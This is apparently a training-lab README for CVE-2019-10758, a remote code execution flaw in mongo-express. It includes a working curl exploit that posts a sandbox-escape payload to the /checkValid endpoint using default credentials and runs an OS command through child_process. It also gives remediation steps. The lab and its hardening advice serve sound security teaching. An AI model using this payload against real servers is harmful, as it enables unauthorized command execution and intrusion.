# Mongo-Express Server-Side JavaScript Execution RCE (CVE-2019-10758)

## Overview

mongo-express is a web-based administrative interface for MongoDB written in Node.js. In versions prior to 0.54.0, endpoints utilizing the toBSON method execute user-controlled input within Node.js vm.runInContext without sufficient sandboxing, allowing remote authenticated users (or unauthenticated attackers where default credentials admin:pass are left exposed) to execute arbitrary JavaScript code and OS commands.

- **Service Access**: `http://localhost:8140/`
- **Default Credentials**: `admin:pass`
- **Docker Shortcut**: `./lab start mongo-express-rce`
- **Container Name**: `cyberlab_02_mongo_express_rce`
- **RAM Footprint**: ~350M

---

## Exploitation Walkthrough

### 1. Verify Web UI Access

```bash
curl -u admin:pass -i http://localhost:8140/
```

### 2. Trigger Remote Code Execution via vm.runInContext

```bash
curl -i -X POST 'http://localhost:8140/checkValid' \
  -u admin:pass \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/pwned_mongo_express")'
```

### 3. Verify File Creation Inside Container

```bash
docker exec -it cyberlab_02_mongo_express_rce ls -la /tmp/pwned_mongo_express
```

---

## Defensive Remediation & Hardening

1. Upgrade mongo-express to version 0.54.0 or newer.
2. Disable endpoint exposure on untrusted network interfaces and enforce strong custom credentials.
3. Utilize hardened node sandboxes or container isolation without child process privileges.

---

## Video Walkthroughs & Technical References

- [NoSQLi Tutorial Using PortSwigger (with labs)](https://www.youtube.com/watch?v=5SmDLBQxmXw)
- [Mongo-Express CVE-2019-10758 Advisory](https://nvd.nist.gov/vuln/detail/CVE-2019-10758)
- [Vulhub Mongo-Express Environment](https://vulhub.org/#/environments/mongo-express/CVE-2019-10758/)
